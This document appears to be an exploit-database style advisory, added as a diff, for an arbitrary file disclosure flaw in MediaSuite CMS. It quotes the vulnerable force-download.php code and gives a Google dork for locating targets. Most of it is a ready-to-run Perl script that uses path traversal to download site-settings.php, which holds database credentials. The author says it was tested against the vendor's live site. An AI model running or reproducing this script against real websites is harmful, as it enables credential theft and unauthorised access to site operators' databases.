@@ -1,0 +1,110 @@
+                .__        _____        _______                 
+                |  |__    /  |  |___  __\   _  \_______   ____  
+                |  |  \  /   |  |\  \/  /  /_\  \_  __ \_/ __ \ 
+                |      \/    ^   />    <\  \_/   \  | \/\  ___/ 
+                |___|  /\____   |/__/\_ \\_____  /__|    \___  >
+                     \/      |__|      \/      \/            \/ 
+                         _____________________________  
+                        /   _____/\_   _____/\_   ___ \ 
+                        \_____  \  |    __)_ /    \  \/    http://twitter.com/h4SEC
+                        /        \ |        \\     \____   Proof Video: https://www.youtube.com/watch?v=7yxbfD1YK8Y
+                       /_______  //_______  / \______  /
+~~~~~~~~~~~~~~~[My]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+[+] Author : KnocKout
+[~] E-Mail : knockout@e-mail.com.tr
+[~] Twitter: http://twitter.com/h4SEC
+[~] HomePage : http://h4x0resec.blogspot.com - http://cyber-warrior.org - http://www.fiXen.org
+[~] Greetz: ZoRLu, DaiMon, VolqaN, DaiMon, KedAns-Dz , Septemb0x, BARCOD3, b3mb4m, SysToxic, EthicalHacker and all TurkSec Group members.
+~~~~~~~~~~~~~~~~[Software info]~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+|~Web App. : MediaSuite CMS - Artibary File Disclosure Exploit
+|~Price : N/A
+|~Version : All CMS
+|~Software: http://www.mediasuite.ca
+|~Vulnerability Style :  File Disclosure
+|~Vulnerability Dir : /
+|~Google Dork : "MediaSuite.ca - Website Design, Media Marketing Suite - Barrie Ontario"
+|[~]Date : "20.04.2015"
+|[~]Exploit Tested on :  >>>> www.mediasuite.ca ( Official Web ) <<<<<
+----------------------------------------------------------
+---------------------Info;--------------------------------
+----------------------------------------------------------
+can be easily found in any database password for this "site-settings.php" will be sufficient to read
+possible to read the file on the local database. 
+incorrect coding and unconscious in it causing ""force-download.php"" file.
+that's laughter reason codes:)
+
+##################################################################################################
+      file in "force-download.php"
+..
+..
+..
+$type = $_GET['type'];
+$file = $_GET['file'];
+	
+	if($type == "1"){
+		$filename = "../uploads/$file";
+	}
+..
+..
+..
+}
+header("Pragma: public"); // required
+header("Expires: 0");
+header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
+header("Cache-Control: private",false); // required for certain browsers 
+header("Content-Type: $ctype");
+// change, added quotes to allow spaces in filenames, by Rajkumar Singh
+header("Content-Disposition: attachment; filename=\"".basename($filename)."\";" );
+header("Content-Transfer-Encoding: binary");
+header("Content-Length: ".filesize($filename));
+readfile("$filename");
+exit();
+..
+...
+	   
+##################################################################################################
+##############################Exploit.pl#########################################################
+##################################################################################################
+	
+use LWP::Simple;
+use LWP::UserAgent;
+system('cls');
+system('title MediaSuite CMS - Artibary File Disclosure Exploit');
+system('color 2');
+if(@ARGV < 2)
+{
+print "[-]Su Sekilde Kocum. \n\n";
+&help; exit();
+}
+sub help()
+{
+print "[+] Usaqe : perl $0 Target /path/ \n";
+print "[+] Usage  : perl $0 localhost / \n";
+}
+print "\n************************************************************************\n";
+print "\* MediaSuite CMS - Artibary File Disclosure Exploit             *\n";
+print "\* Exploit coded by : KnocKout                                                  *\n";
+print "\* Contact : twitter.com/h4SEC                                 *\n";
+print "\* --                                    *\n";
+print "\*********************************************************************\n\n\n";
+($TargetIP, $path, $File,) = @ARGV;
+$File="includes/force-download.php?type=1&file=../includes/site-settings.php";
+my $url = "http://" . $TargetIP . $path . $File;
+print "\n Biraz Bekle. \n\n";
+my $useragent = LWP::UserAgent->new();
+my $request = $useragent->get($url,":content_file" => "site-settings.php");
+if ($request->is_success)
+{
+print "[+] Exploit Basarili, kodlayanin eline saglik \n\n";
+print "[+] Exploit Basarili. !\n";
+print "[+] Database bilgilerinin yer aldigi (site-settings.php) dosyasi indirildi. \n";
+print "[+] h4 SEC \n";
+print "[+] Special tnX : ZoRLu, _UnDeRTaKeR, DaiMon, VoLqaN, BARCOD3, Septemb0x, EthicalHacker
+ \n";
+exit();
+}
+else
+{
+print "[!] Exploit $url Basarisiz !\n[!] ".$request->status_line."\n";
+exit();
+}
